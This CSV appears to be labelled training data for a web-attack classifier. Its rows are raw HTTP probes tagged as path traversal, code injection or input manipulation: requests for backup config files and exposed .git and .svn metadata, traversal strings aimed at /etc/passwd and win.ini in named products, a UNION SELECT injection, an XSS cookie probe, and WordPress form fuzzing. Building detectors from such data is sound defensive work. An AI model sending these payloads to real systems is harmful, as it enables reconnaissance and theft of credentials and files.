text,label
HEAD /respaldo.sql nan,153 - Input Data Manipulation
HEAD /data.sql nan,153 - Input Data Manipulation
HEAD /old.sql nan,153 - Input Data Manipulation
HEAD /usuarios.sql nan,153 - Input Data Manipulation
HEAD /bdb.sql nan,153 - Input Data Manipulation
HEAD /1.sql nan,153 - Input Data Manipulation
HEAD /admin/download/backup.sql nan,153 - Input Data Manipulation
GET /boot.ini,153 - Input Data Manipulation
HEAD /.hgignore nan,126 - Path Traversal
HEAD /.gitignore nan,126 - Path Traversal
HEAD /.nsf/../winnt/win.ini nan,153 - Input Data Manipulation
GET /_vti_bin/_vti_aut/author.dll,153 - Input Data Manipulation
GET /_vti_bin/_vti_aut/dvwssr.dll,153 - Input Data Manipulation
GET /_vti_bin/_vti_adm/admin.dll,153 - Input Data Manipulation
GET /_vti_bin/shtml.dll,153 - Input Data Manipulation
GET /_vti_pvt/administrator.pwd,153 - Input Data Manipulation
GET /_vti_pvt/administrators.pwd,153 - Input Data Manipulation
GET /_vti_pvt/authors.pwd,153 - Input Data Manipulation
GET /_vti_pvt/service.pwd,153 - Input Data Manipulation
GET /_vti_pvt/users.pwd,153 - Input Data Manipulation
GET /.svn/,126 - Path Traversal
GET /.svn/text-base/.htaccess.svn-base,126 - Path Traversal
GET /.svn/text-base/.htpasswd.svn-base,126 - Path Traversal
GET /.svn/text-base/Web.config.svn-base,126 - Path Traversal
GET /.git/HEAD,126 - Path Traversal
GET /.hg/requires,126 - Path Traversal
GET /cwhp/auditLog.do?file=..\..\..\..\..\..\..\boot.ini,126 - Path Traversal
GET /cwhp/auditLog.do?file=..\..\..\..\..\..\..\Program%20Files\CSCOpx\MDC\Tomcat\webapps\triveni\WEB-INF\classes\schedule.properties,126 - Path Traversal
GET /cwhp/auditLog.do?file=..\..\..\..\..\..\..\Program%20Files\CSCOpx\lib\classpath\com\cisco\nm\cmf\dbservice2\DBServer.properties,126 - Path Traversal
GET /cwhp/auditLog.do?file=..\..\..\..\..\..\..\Program%20Files\CSCOpx\log\dbpwdChange.log,126 - Path Traversal
GET /CuteSoft_Client/CuteEditor/Load.ashx?type=image&file=../../../web.config,126 - Path Traversal
GET /plugins/PluginController.php?path=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini%00,153 - Input Data Manipulation
GET /tiki-listmovies.php?movie=../../../../../../etc/passwd%001234,153 - Input Data Manipulation
GET ?feed=rss,153 - Input Data Manipulation
GET ?feed=rss2,153 - Input Data Manipulation
GET ?feed=atom,153 - Input Data Manipulation
HEAD /databases/acidcat_3.mdb nan,153 - Input Data Manipulation
HEAD /mdb-database/dblog.mdb nan,153 - Input Data Manipulation
HEAD /db/users.mdb nan,153 - Input Data Manipulation
GET /?p4yl04d=../../../../../../../../../../../../../../../../../etc/passwd,242 - Code Injection
"GET /?p4yl04d2=1%20UNION%20ALL%20SELECT%201,2,3,table_name%20FROM%20information_schema.tables",242 - Code Injection
GET /?p4yl04d3=<script>alert(document.cookie)</script>,242 - Code Injection
GET /wp-config.bak,153 - Input Data Manipulation
GET /wp-config.php.bak,153 - Input Data Manipulation
GET /wp-config.php~,153 - Input Data Manipulation
"GET /zimbra/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../dev/null%00",153 - Input Data Manipulation
GET /%23wp-config.php%23,126 - Path Traversal
"GET /zimbra/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../etc/passwd%00",153 - Input Data Manipulation
GET /Copy%20of%20wp-config.php,126 - Path Traversal
GET /wp-config.php.save,126 - Path Traversal
GET /.wp-config.php.swp,153 - Input Data Manipulation
GET /wp-config.php.swp,153 - Input Data Manipulation
GET /wp-config.php.old,153 - Input Data Manipulation
GET /wp-content/plugins/all-in-one-seo-pack/,242 - Code Injection
GET /wp-content/plugins/all-in-one-wp-security-and-firewall/,242 - Code Injection
GET /wp-content/plugins/all-in-one-wp-migration/,242 - Code Injection
GET /config.bak,153 - Input Data Manipulation
GET /config.php.bak,153 - Input Data Manipulation
GET /config.php~,153 - Input Data Manipulation
GET /.config.php.swp,153 - Input Data Manipulation
GET /config.php.swp,153 - Input Data Manipulation
GET /config.php.old,153 - Input Data Manipulation
GET /configuration.bak,153 - Input Data Manipulation
GET /configuration.php.bak,153 - Input Data Manipulation
GET /configuration.php~,153 - Input Data Manipulation
GET /.configuration.php.swp,153 - Input Data Manipulation
GET /configuration.php.swp,153 - Input Data Manipulation
GET /configuration.php.old,153 - Input Data Manipulation
GET /LocalSettings.bak,153 - Input Data Manipulation
GET /LocalSettings.php.bak,153 - Input Data Manipulation
GET /LocalSettings.php~,153 - Input Data Manipulation
GET /.LocalSettings.php.swp,153 - Input Data Manipulation
GET /LocalSettings.php.swp,153 - Input Data Manipulation
GET /LocalSettings.php.old,153 - Input Data Manipulation
GET /mediawiki/LocalSettings.bak,153 - Input Data Manipulation
GET /mediawiki/LocalSettings.php.bak,153 - Input Data Manipulation
GET /mediawiki/LocalSettings.php~,153 - Input Data Manipulation
GET /mediawiki/.LocalSettings.php.swp,153 - Input Data Manipulation
GET /mediawiki/LocalSettings.php.swp,153 - Input Data Manipulation
GET /mediawiki/LocalSettings.php.old,153 - Input Data Manipulation
GET /mt-config.bak,153 - Input Data Manipulation
GET /mt-config.cgi.bak,153 - Input Data Manipulation
GET /mt-config.cgi~,153 - Input Data Manipulation
GET /.mt-config.cgi.swp,153 - Input Data Manipulation
GET /mt-config.cgi.swp,153 - Input Data Manipulation
GET /mt-config.cgi.old,153 - Input Data Manipulation
GET /mt-static/mt-config.bak,153 - Input Data Manipulation
GET /mt-static/mt-config.cgi.bak,153 - Input Data Manipulation
GET /mt-static/mt-config.cgi~,153 - Input Data Manipulation
GET /mt-static/.mt-config.cgi.swp,153 - Input Data Manipulation
GET /mt-static/mt-config.cgi.swp,153 - Input Data Manipulation
GET /mt-static/mt-config.cgi.old,153 - Input Data Manipulation
GET /settings.bak,153 - Input Data Manipulation
GET /settings.php.bak,153 - Input Data Manipulation
GET /settings.php~,153 - Input Data Manipulation
GET /.settings.php.swp,153 - Input Data Manipulation
GET /settings.php.swp,153 - Input Data Manipulation
GET /settings.php.old,153 - Input Data Manipulation
GET /%23.htaccess%23,126 - Path Traversal
GET /Copy%20of%20.htaccess,126 - Path Traversal
POST /blog/index.php/my-account/edit-password/ password_current=%2Fetc%2Fpasswd&password_1=ZWuAr!&password_2=ZWuAr!&_wpnonce=b9dad6a8b5&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-password%2F&save_change_password=Save+changes&action=save_change_password,242 - Code Injection
POST /blog/index.php/my-account/edit-password/ password_current=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&password_1=PWq*-kR#&password_2=PWq*-kR#&_wpnonce=b9dad6a8b5&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-password%2F&save_change_password=Save+changes&action=save_change_password,242 - Code Injection
POST /blog/index.php/my-account/edit-password/ password_current=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&password_1=EUSc3H&password_2=EUSc3H&_wpnonce=b9dad6a8b5&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-password%2F&save_change_password=Save+changes&action=save_change_password,242 - Code Injection
POST /blog/index.php/my-account/edit-password/ password_current=etc%2Fpasswd&password_1=qLHorW3&password_2=qLHorW3&_wpnonce=b9dad6a8b5&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-password%2F&save_change_password=Save+changes&action=save_change_password,242 - Code Injection
POST /blog/index.php/my-account/edit-password/ password_current=5#dSu&password_1=%2Fetc%2Fpasswd&password_2=5#dSu&_wpnonce=b9dad6a8b5&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-password%2F&save_change_password=Save+changes&action=save_change_password,242 - Code Injection
POST /blog/index.php/my-account/edit-password/ password_current=S7FphZIC&password_1=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&password_2=S7FphZIC&_wpnonce=b9dad6a8b5&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-password%2F&save_change_password=Save+changes&action=save_change_password,242 - Code Injection
POST /blog/index.php/my-account/edit-password/ password_current=5U5-IwrN&password_1=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&password_2=5U5-IwrN&_wpnonce=b9dad6a8b5&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-password%2F&save_change_password=Save+changes&action=save_change_password,242 - Code Injection
POST /blog/index.php/my-account/edit-password/ password_current=Glkcw&password_1=etc%2Fpasswd&password_2=Glkcw&_wpnonce=b9dad6a8b5&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-password%2F&save_change_password=Save+changes&action=save_change_password,242 - Code Injection
POST /blog/index.php/my-account/edit-password/ username=%2Fetc%2Fpasswd&password=Y#h9bejQ&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-password%2F&login=Login&redirect=&rememberme=forever,242 - Code Injection
POST /blog/index.php/my-account/edit-password/ username=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&password=0max$*&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-password%2F&login=Login&redirect=&rememberme=forever,242 - Code Injection
POST /blog/index.php/my-account/edit-password/ username=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&password=gTim3&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-password%2F&login=Login&redirect=&rememberme=forever,242 - Code Injection
POST /blog/index.php/my-account/edit-password/ username=etc%2Fpasswd&password=fmgAm&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-password%2F&login=Login&redirect=&rememberme=forever,242 - Code Injection
POST /blog/index.php/my-account/edit-password/ password_current=mOx5k#P&password_1=mOx5k#P&password_2=%2Fetc%2Fpasswd&_wpnonce=b9dad6a8b5&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-password%2F&save_change_password=Save+changes&action=save_change_password,242 - Code Injection
POST /blog/index.php/my-account/edit-password/ password_current=pYc6Xwd&password_1=pYc6Xwd&password_2=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&_wpnonce=b9dad6a8b5&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-password%2F&save_change_password=Save+changes&action=save_change_password,242 - Code Injection
POST /blog/index.php/my-account/edit-password/ password_current=uNRnAsaP&password_1=uNRnAsaP&password_2=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&_wpnonce=b9dad6a8b5&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-password%2F&save_change_password=Save+changes&action=save_change_password,242 - Code Injection
POST /blog/index.php/my-account/edit-password/ username=ashamedZebra9&password=%2Fetc%2Fpasswd&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-password%2F&login=Login&redirect=&rememberme=forever,242 - Code Injection
POST /blog/index.php/my-account/edit-password/ username=morbidLapwing1&password=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-password%2F&login=Login&redirect=&rememberme=forever,242 - Code Injection
POST /blog/index.php/my-account/edit-password/ password_current=f1vFJb&password_1=f1vFJb&password_2=etc%2Fpasswd&_wpnonce=b9dad6a8b5&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-password%2F&save_change_password=Save+changes&action=save_change_password,242 - Code Injection
POST /blog/index.php/my-account/edit-password/ username=blissfulLizard1&password=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-password%2F&login=Login&redirect=&rememberme=forever,242 - Code Injection
POST /blog/index.php/my-account/edit-password/ username=culturedFlamingo3&password=etc%2Fpasswd&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-password%2F&login=Login&redirect=&rememberme=forever,242 - Code Injection
POST /blog/index.php/my-account/edit-password/ password_current=69XdW9&password_1=69XdW9&password_2=69XdW9&_wpnonce=%2Fetc%2Fpasswd&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-password%2F&save_change_password=Save+changes&action=save_change_password,242 - Code Injection
POST /blog/index.php/my-account/edit-password/ password_current=4C2#$weu&password_1=4C2#$weu&password_2=4C2#$weu&_wpnonce=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-password%2F&save_change_password=Save+changes&action=save_change_password,242 - Code Injection
POST /blog/index.php/my-account/edit-password/ password_current=z7J*v&password_1=z7J*v&password_2=z7J*v&_wpnonce=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-password%2F&save_change_password=Save+changes&action=save_change_password,242 - Code Injection
POST /blog/index.php/my-account/edit-password/ password_current=szpVtZpP&password_1=szpVtZpP&password_2=szpVtZpP&_wpnonce=etc%2Fpasswd&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-password%2F&save_change_password=Save+changes&action=save_change_password,242 - Code Injection
POST /blog/index.php/my-account/edit-password/ username=wingedSalt9&password=Q8*jd&user-registration-login-nonce=%2Fetc%2Fpasswd&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-password%2F&login=Login&redirect=&rememberme=forever,242 - Code Injection
POST /blog/index.php/my-account/edit-password/ username=dearLizard2&password=pHhQzIU&user-registration-login-nonce=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-password%2F&login=Login&redirect=&rememberme=forever,242 - Code Injection
POST /blog/index.php/my-account/edit-password/ username=joyfulPie6&password=eGMD8$8&user-registration-login-nonce=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-password%2F&login=Login&redirect=&rememberme=forever,242 - Code Injection
POST /blog/index.php/my-account/edit-password/ username=debonairPie7&password=G1mseIW&user-registration-login-nonce=etc%2Fpasswd&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-password%2F&login=Login&redirect=&rememberme=forever,242 - Code Injection
POST /blog/index.php/my-account/edit-password/ password_current=C7x7Op3&password_1=C7x7Op3&password_2=C7x7Op3&_wpnonce=b9dad6a8b5&_wp_http_referer=%2Fetc%2Fpasswd&save_change_password=Save+changes&action=save_change_password,242 - Code Injection
POST /blog/index.php/my-account/edit-password/ password_current=&7xmIpf8&password_1=&7xmIpf8&password_2=&7xmIpf8&_wpnonce=b9dad6a8b5&_wp_http_referer=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&save_change_password=Save+changes&action=save_change_password,242 - Code Injection
POST /blog/index.php/my-account/edit-password/ password_current=pMAYCyA&password_1=pMAYCyA&password_2=pMAYCyA&_wpnonce=b9dad6a8b5&_wp_http_referer=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&save_change_password=Save+changes&action=save_change_password,242 - Code Injection
POST /blog/index.php/my-account/edit-password/ username=humorousLocust7&password=_C5XKa&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fetc%2Fpasswd&login=Login&redirect=&rememberme=forever,242 - Code Injection
POST /blog/index.php/my-account/edit-password/ password_current=1Ene!&password_1=1Ene!&password_2=1Ene!&_wpnonce=b9dad6a8b5&_wp_http_referer=etc%2Fpasswd&save_change_password=Save+changes&action=save_change_password,242 - Code Injection
POST /blog/index.php/my-account/edit-password/ username=murkyCockatoo7&password=6SE1EXOd&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&login=Login&redirect=&rememberme=forever,242 - Code Injection
POST /blog/index.php/my-account/edit-password/ username=thriftyBittern2&password=SLCEqIe&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&login=Login&redirect=&rememberme=forever,242 - Code Injection
POST /blog/index.php/my-account/edit-password/ username=enragedRice0&password=Ygxd#8NZ&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=etc%2Fpasswd&login=Login&redirect=&rememberme=forever,242 - Code Injection
POST /blog/index.php/my-account/edit-password/ password_current=2XUPYoP&password_1=2XUPYoP&password_2=2XUPYoP&_wpnonce=b9dad6a8b5&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-password%2F&save_change_password=%2Fetc%2Fpasswd&action=save_change_password,242 - Code Injection
POST /blog/index.php/my-account/edit-password/ password_current=S7QaYX#O&password_1=S7QaYX#O&password_2=S7QaYX#O&_wpnonce=b9dad6a8b5&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-password%2F&save_change_password=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&action=save_change_password,242 - Code Injection
POST /blog/index.php/my-account/edit-password/ password_current=jVIK8F&password_1=jVIK8F&password_2=jVIK8F&_wpnonce=b9dad6a8b5&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-password%2F&save_change_password=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&action=save_change_password,242 - Code Injection
POST /blog/index.php/my-account/edit-password/ username=boastfulBass3&password=TqQmA&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-password%2F&login=%2Fetc%2Fpasswd&redirect=&rememberme=forever,242 - Code Injection
POST /blog/index.php/my-account/edit-password/ password_current=-O66F&password_1=-O66F&password_2=-O66F&_wpnonce=b9dad6a8b5&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-password%2F&save_change_password=etc%2Fpasswd&action=save_change_password,242 - Code Injection
